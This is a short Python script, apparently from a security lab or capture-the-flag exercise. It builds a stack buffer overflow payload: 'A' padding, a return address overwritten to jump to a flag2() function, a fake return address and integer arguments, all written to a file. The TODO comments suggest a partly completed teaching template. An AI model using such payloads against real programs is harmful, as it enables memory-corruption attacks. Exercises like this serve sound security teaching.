import struct

# Convert integer to byte array (integer little endian).
def dw(i):
    return struct.pack("<I",i)

# TODO 1: Fi1l this with offset to return address location.
offset =  48 #52

# TODO: Fill this with the address of the flag1() function.
flag1_addr = 0x8048476

# TODO: Fill this with the address of the flag2() function.
flag2_addr = 0x8048486

# Initialize payload.
payload = ''
address = 0xf7e2b9d0

# Add a number of 'offset' A characters to the payload.
payload += 'A' * offset
payload += 'B' * 4 + dw (flag2_addr) + dw(address)
payload += dw(300)
payload += dw(11)
payload += dw(1619)


# TODO: Add more to the payload such as the value overwriting the return address.
# Use dw() function.

with open('payload', 'wb') as f:
    f.write(payload)
